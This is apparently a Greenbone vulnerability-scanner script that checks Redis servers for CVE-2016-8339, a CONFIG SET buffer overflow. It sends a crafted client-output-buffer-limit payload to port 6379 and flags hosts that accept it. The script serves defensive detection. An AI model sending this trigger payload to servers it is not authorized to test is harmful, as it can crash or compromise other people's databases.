CPE = "cpe:/a:redis:redis";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.809306" );
	script_version( "$Revision: 12051 $" );
	script_cve_id( "CVE-2016-8339" );
	script_bugtraq_id( 93283 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-24 11:14:54 +0200 (Wed, 24 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2016-11-03 15:17:52 +0530 (Thu, 03 Nov 2016)" );
	script_name( "Redis Server 'CONFIG SET' Command Buffer Overflow Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with Redis server
  and is prone to buffer overflow vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted 'CONFIG SET' command
  and check whether it is able to execute the command or not." );
	script_tag( name: "insight", value: "The flaw is due to an out of bounds
  write error existing in the handling of the client-output-buffer-limit
  option during the CONFIG SET command for the Redis data structure store." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute an arbitrary code." );
	script_tag( name: "affected", value: "Redis Server 3.2.x prior to 3.2.4" );
	script_tag( name: "solution", value: "Upgrade to Redis Server 3.2.4 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.talosintelligence.com/reports/TALOS-2016-0206" );
	script_category( ACT_ATTACK );
	script_family( "Databases" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "gb_redis_detect.sc" );
	script_require_ports( "Services/redis", 6379 );
	script_mandatory_keys( "redis/installed" );
	script_xref( name: "URL", value: "http://redis.io" );
	exit( 0 );
}
require("host_details.inc.sc");
if(!redisPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!soc = open_sock_tcp( redisPort )){
	exit( 0 );
}
payload_cmd = "CONFIG SET client-output-buffer-limit \"master 3735928559 3405691582 373529054\"\r\n";
send( socket: soc, data: payload_cmd );
recv = recv( socket: soc, length: 1024 );
close( soc );
if(!ContainsString( recv, "-ERR Invalid argument" ) && ContainsString( recv, "OK" )){
	security_message( port: redisPort );
	exit( 0 );
}

